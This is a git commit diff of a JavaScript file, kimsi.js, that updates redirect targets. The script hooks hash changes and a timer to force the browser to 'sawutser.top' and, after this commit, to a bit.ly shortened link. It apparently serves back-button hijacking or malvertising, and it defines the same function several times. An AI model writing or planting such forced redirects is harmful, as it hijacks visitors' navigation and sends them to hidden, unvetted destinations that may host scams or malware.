8ec49f87744bd75d49408ce47149c06c26d3914e
katemj25 <mbokofficial1@gmail.com>
2025-06-03 18:09:56 -0700

    Update kimsi.js

--- kimsi.js
+++ kimsi.js
@@ -4,13 +4,13 @@ window.onhashchange=function(){jp();};
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://sawutser.top/4/9089389";
+        location.href="https://bit.ly/3W6qUJU";
     }
     function goon(){
         location.href="https://sawutser.top/4/9089389";
     }
 function goon(){
-        location.href="https://sawutser.top/4/9089389";
+        location.href="https://bit.ly/3W6qUJU";
     }
 function goon(){
         location.href="https://sawutser.top/4/9089389";
